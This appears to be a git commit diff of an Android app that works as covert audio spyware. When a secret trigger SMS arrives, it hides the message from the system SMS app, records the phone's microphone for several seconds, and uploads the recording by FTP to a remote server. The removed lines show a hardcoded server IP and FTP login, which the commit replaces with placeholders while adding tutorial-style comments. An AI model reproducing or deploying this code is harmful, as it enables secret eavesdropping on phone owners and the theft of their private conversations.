7b74762c4d7e2d791410926dd495b2b8d057f5e6
arjunsk <arjunsk15@gmail.com>
2016-02-23 01:44:17 +0530

    first commit

--- src/com/example/smsreceiver/FtpUpload.java
+++ src/com/example/smsreceiver/FtpUpload.java
@@ -15,30 +15,30 @@ public class FtpUpload extends AsyncTask<Void, Void, Void> {
     
 	protected Void doInBackground(Void... params) {
 		
-		
 		FTPClient con = null;
 
 		try {
-			con = new FTPClient();
-			con.connect("31.170.161.76");
+			con = new FTPClient();  // con is the FTPClient
+			con.connect("121.121.121.121"); //set the ip address of the server
 
-			if (con.login("a5693422", "test123")) {
+			if (con.login("ftp_username", "ftp_password")) {   // checks if login is successful
+				
 				con.enterLocalPassiveMode(); // important!
+				
 				con.setFileType(FTP.BINARY_FILE_TYPE);
 
-				String data = Environment.getExternalStorageDirectory().getAbsolutePath() + "/record.3gpp";
-
-				FileInputStream in = new FileInputStream(new File(data));
-
-				boolean result = con.storeFile("public_html/docs/record.3gpp", in);
-
+				String data = Environment.getExternalStorageDirectory().getAbsolutePath() + "/record.3gpp"; // file to upload
+				
+				FileInputStream in = new FileInputStream(new File(data)); 
+				boolean result = con.storeFile("public_html/docs/record.3gpp", in);  // where to store in the server
 				in.close();
+				
 				if (result) {
 					Log.v("upload result", "succeeded");
-					//Toast.makeText(getApplicationContext(), "upload result",Toast.LENGTH_SHORT).show();
+					//Toast.makeText(getApplicationContext(), "upload Sucess",Toast.LENGTH_SHORT).show();
 				}
-				con.logout();
-				con.disconnect();
+				con.logout();  // logout ftp
+				con.disconnect(); //disconnect ftp
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
--- src/com/example/smsreceiver/SmsReceiver.java
+++ src/com/example/smsreceiver/SmsReceiver.java
@@ -1,113 +1,134 @@
 package com.example.smsreceiver;
 
-
-
 import java.io.IOException;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.telephony.SmsMessage;
-import android.widget.Toast;
 
+// Here we are creating a custom BroadcastReceiver for receiving the SMS.
 public class SmsReceiver extends BroadcastReceiver {
 	
-	private MediaRecorder myRecorder;
+	private MediaRecorder myRecorder;  //used for recording
 	private String outputFile = null;
 
+	//Telephony class is the class that deals with network related things.
+	//We are using the SMS_RECEIVED functionality.
     private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 
+    //function that corresponds to the broadcast event.
     @Override
     public void onReceive(Context context, Intent intent) {
+    	
+    	//checks if the broadcast is send by SMS received.
         if (intent.getAction().equals(SMS_RECEIVED)) {
+        	
+        	// Bundle will hold the SMS details.
             Bundle bundle = intent.getExtras();
+            
+            //checks if it is valid
             if (bundle != null) {
-                // get sms objects
-                Object[] pdus = (Object[]) bundle.get("pdus");
+            	
+            	/*//////////////////////////////////
+            	 *------>  The SMS PROCESSING PART
+                *//////////////////////////////////
+            	
+            	
+            	/*
+            	 * A PDU is a “protocol data unit”, which is the industry format for an SMS message.
+            	 * A large message might be broken into many, which is why it is an array of objects.
+            	*/
+                
+            	// get sms objects
+            	Object[] pdus = (Object[]) bundle.get("pdus");
                 if (pdus.length == 0) {
                     return;
                 }
+                
                 // large message might be broken into many
                 SmsMessage[] messages = new SmsMessage[pdus.length];
-                StringBuilder sb = new StringBuilder();
+                StringBuilder sb = new StringBuilder();  // we append the broken messages to get the full message.
+                 
                 for (int i = 0; i < pdus.length; i++) {
                     messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                     sb.append(messages[i].getMessageBody());
                 }
-                String sender = messages[0].getOriginatingAddress();
-                String message = sb.toString();
+                
+                
+                String sender = messages[0].getOriginatingAddress();  // senders number
+                String message = sb.toString();  // message
                
-                // Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
+                if(message.equals("RECORD_APP_10")){
                 
-                
-                if(message.equals("RECORD_SK")){
-                
-                //Doesnt broadcast it to  the SMS APP.
-                abortBroadcast();
+	                //Doesn't broadcast it to  the system SMS APP.
+	                abortBroadcast();
+	
+	               
+	            	/*///////////////////////////
+	            	 *------>  The Recording PART
+	                *///////////////////////////
+	                
+	                
+	                // the destination to store the recording 
+	        		outputFile = Environment.getExternalStorageDirectory().getAbsolutePath() + "/record.3gpp";  
+	
+	        		myRecorder = new MediaRecorder();
+	        		myRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);  // setting the audio source as MIC
+	        		myRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);  //set audio format 3gpp
+	        		myRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB); //setting audio encoder
+	        		myRecorder.setOutputFile(outputFile);   // sets the output path.
+	
+	        		// record part  -- START'S THE RECORDING
+	        		try {
+	        			myRecorder.prepare();
+	        			myRecorder.start();
+	        		} catch (IllegalStateException e) {
+	        			e.printStackTrace();
+	        		} catch (IOException e) {
+	        			// prepare() fails
+	        			e.printStackTrace();
+	        		}
+	        		
+	        		
+	        		/*
+	        		 * > Threads are generic processing tasks that can do most things, but one thing they cannot do is update the UI.
+	        		 * > Handlers on the other hand are bound to threads that allow you to communicate with the UI thread 
+	        		 *  Here it is myRecorder object.
+	        		 * */
+	
+	        		//STOPS the record after 10 sec.
+	        		final Handler handler = new Handler();
+	        		handler.postDelayed(new Runnable() {
+	        			@Override
+	        			public void run() {
+	        				//STOP 
+	        				try {
+	        					myRecorder.stop();
+	        					myRecorder.release();
+	        					myRecorder = null;
+	        				} catch (IllegalStateException e) {
+	        					// it is called before start()
+	        					e.printStackTrace();
+	        				} catch (RuntimeException e) {
+	        					// no valid audio/video data has been received
+	        					e.printStackTrace();
+	        				}
+	        			}
+	        		}, 10000); //1 sec --> 1000 milli seconds
+	
+	
+	            	/*////////////////////////
+	            	 *------>  The UPLOAD PART
+	                */////////////////////////
+	        		
+	        		new FtpUpload().execute();
 
-                
-                //////////////////////////////////////////////////////////////////////////////////////////////////
-            	//The Record PART
-                
-        		// store it to sd card
-        		outputFile = Environment.getExternalStorageDirectory().getAbsolutePath() + "/record.3gpp";
-
-        		myRecorder = new MediaRecorder();
-        		myRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        		myRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-        		myRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
-        		myRecorder.setOutputFile(outputFile);
-
-        		// record part  START
-        		try {
-        			myRecorder.prepare();
-        			myRecorder.start();
-        		} catch (IllegalStateException e) {
-        			// start:it is called before prepare()
-        			// prepare: it is called after start() or before setOutputFormat()
-        			e.printStackTrace();
-        		} catch (IOException e) {
-        			// prepare() fails
-        			e.printStackTrace();
-        		}
-        		
-
-        		final Handler handler = new Handler();
-        		handler.postDelayed(new Runnable() {
-        			@Override
-        			public void run() {
-        				//STOP 
-        				try {
-        					myRecorder.stop();
-        					myRecorder.release();
-        					myRecorder = null;
-        				} catch (IllegalStateException e) {
-        					// it is called before start()
-        					e.printStackTrace();
-        				} catch (RuntimeException e) {
-        					// no valid audio/video data has been received
-        					e.printStackTrace();
-        				}
-        	
-        			}
-        		}, 4000);
-
-
-        		// upload
-        		new FtpUpload().execute();
-        		
-        		/////////////////////////////////////////////////////////////////////////////////////////
-                
-
-                
-                }
-                
-
+                }         
             }
         }
     }
